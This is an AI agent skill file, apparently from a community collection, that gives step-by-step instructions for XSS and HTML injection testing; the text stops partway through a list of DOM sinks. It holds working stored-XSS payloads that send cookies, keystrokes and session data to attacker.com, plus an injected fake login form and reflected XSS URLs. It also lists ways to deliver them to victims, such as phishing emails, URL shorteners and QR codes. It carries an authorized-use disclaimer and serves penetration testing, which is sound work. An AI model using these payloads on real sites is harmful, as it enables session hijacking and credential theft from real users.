     1|---
     2|name: ag-xss-html-injection
     3|description: "Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploi"
     4|version: 1.0.0
     5|tags: [antigravity, general]
     6|category: software-development
     7|source: https://github.com/sickn33/antigravity-awesome-skills
     8|---
     9|
    10|---
    11|name: xss-html-injection
    12|description: "Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms."
    13|risk: offensive
    14|source: community
    15|author: zebbern
    16|date_added: "2026-02-27"
    17|---
    18|
    19|> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
    20|
    21|# Cross-Site Scripting and HTML Injection Testing
    22|
    23|## Purpose
    24|
    25|Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.
    26|
    27|## Inputs / Prerequisites
    28|
    29|### Required Access
    30|- Target web application URL with user input fields
    31|- Burp Suite or browser developer tools for request analysis
    32|- Access to create test accounts for stored XSS testing
    33|- Browser with JavaScript console enabled
    34|
    35|### Technical Requirements
    36|- Understanding of JavaScript execution in browser context
    37|- Knowledge of HTML DOM structure and manipulation
    38|- Familiarity with HTTP request/response headers
    39|- Understanding of cookie attributes and session management
    40|
    41|### Legal Prerequisites
    42|- Written authorization for security testing
    43|- Defined scope including target domains and features
    44|- Agreement on handling of any captured session data
    45|- Incident response procedures established
    46|
    47|## Outputs / Deliverables
    48|
    49|- XSS/HTMLi vulnerability report with severity classifications
    50|- Proof-of-concept payloads demonstrating impact
    51|- Session hijacking demonstrations (controlled environment)
    52|- Remediation recommendations with CSP configurations
    53|
    54|## Core Workflow
    55|
    56|### Phase 1: Vulnerability Detection
    57|
    58|#### Identify Input Reflection Points
    59|Locate areas where user input is reflected in responses:
    60|
    61|```
    62|# Common injection vectors
    63|- Search boxes and query parameters
    64|- User profile fields (name, bio, comments)
    65|- URL fragments and hash values
    66|- Error messages displaying user input
    67|- Form fields with client-side validation only
    68|- Hidden form fields and parameters
    69|- HTTP headers (User-Agent, Referer)
    70|```
    71|
    72|#### Basic Detection Testing
    73|Insert test strings to observe application behavior:
    74|
    75|```html
    76|<!-- Basic reflection test -->
    77|<test123>
    78|
    79|<!-- Script tag test -->
    80|<script>alert('XSS')</script>
    81|
    82|<!-- Event handler test -->
    83|<img src=x onerror=alert('XSS')>
    84|
    85|<!-- SVG-based test -->
    86|<svg onload=alert('XSS')>
    87|
    88|<!-- Body event test -->
    89|<body onload=alert('XSS')>
    90|```
    91|
    92|Monitor for:
    93|- Raw HTML reflection without encoding
    94|- Partial encoding (some characters escaped)
    95|- JavaScript execution in browser console
    96|- DOM modifications visible in inspector
    97|
    98|#### Determine XSS Type
    99|
   100|**Stored XSS Indicators:**
   101|- Input persists after page refresh
   102|- Other users see injected content
   103|- Content stored in database/filesystem
   104|
   105|**Reflected XSS Indicators:**
   106|- Input appears only in current response
   107|- Requires victim to click crafted URL
   108|- No persistence across sessions
   109|
   110|**DOM-Based XSS Indicators:**
   111|- Input processed by client-side JavaScript
   112|- Server response doesn't contain payload
   113|- Exploitation occurs entirely in browser
   114|
   115|### Phase 2: Stored XSS Exploitation
   116|
   117|#### Identify Storage Locations
   118|Target areas with persistent user content:
   119|
   120|```
   121|- Comment sections and forums
   122|- User profile fields (display name, bio, location)
   123|- Product reviews and ratings
   124|- Private messages and chat systems
   125|- File upload metadata (filename, description)
   126|- Configuration settings and preferences
   127|```
   128|
   129|#### Craft Persistent Payloads
   130|
   131|```html
   132|<!-- Cookie stealing payload -->
   133|<script>
   134|document.location='http://attacker.com/steal?c='+document.cookie
   135|</script>
   136|
   137|<!-- Keylogger injection -->
   138|<script>
   139|document.onkeypress=function(e){
   140|  new Image().src='http://attacker.com/log?k='+e.key;
   141|}
   142|</script>
   143|
   144|<!-- Session hijacking -->
   145|<script>
   146|fetch('http://attacker.com/capture',{
   147|  method:'POST',
   148|  body:JSON.stringify({cookies:document.cookie,url:location.href})
   149|})
   150|</script>
   151|
   152|<!-- Phishing form injection -->
   153|<div id="login">
   154|<h2>Session Expired - Please Login</h2>
   155|<form action="http://attacker.com/phish" method="POST">
   156|Username: <input name="user"><br>
   157|Password: <input type="password" name="pass"><br>
   158|<input type="submit" value="Login">
   159|</form>
   160|</div>
   161|```
   162|
   163|### Phase 3: Reflected XSS Exploitation
   164|
   165|#### Construct Malicious URLs
   166|Build URLs containing XSS payloads:
   167|
   168|```
   169|# Basic reflected payload
   170|https://target.com/search?q=<script>alert(document.domain)</script>
   171|
   172|# URL-encoded payload
   173|https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E
   174|
   175|# Event handler in parameter
   176|https://target.com/page?name="><img src=x onerror=alert(1)>
   177|
   178|# Fragment-based (for DOM XSS)
   179|https://target.com/page#<script>alert(1)</script>
   180|```
   181|
   182|#### Delivery Methods
   183|Techniques for delivering reflected XSS to victims:
   184|
   185|```
   186|1. Phishing emails with crafted links
   187|2. Social media message distribution
   188|3. URL shorteners to obscure payload
   189|4. QR codes encoding malicious URLs
   190|5. Redirect chains through trusted domains
   191|```
   192|
   193|### Phase 4: DOM-Based XSS Exploitation
   194|
   195|#### Identify Vulnerable Sinks
   196|Locate JavaScript functions that process user input:
   197|
   198|```javascript
   199|// Dangerous sinks
   200|document.write()
   201|document.writeln()
   202|element.innerHTML
   203|element.outerHTML
   204|element.insertAdjacentHTML()
   205|eval()
   206|setTimeout()
   207|setInterval()
   208|Function()
   209|location.href
   210|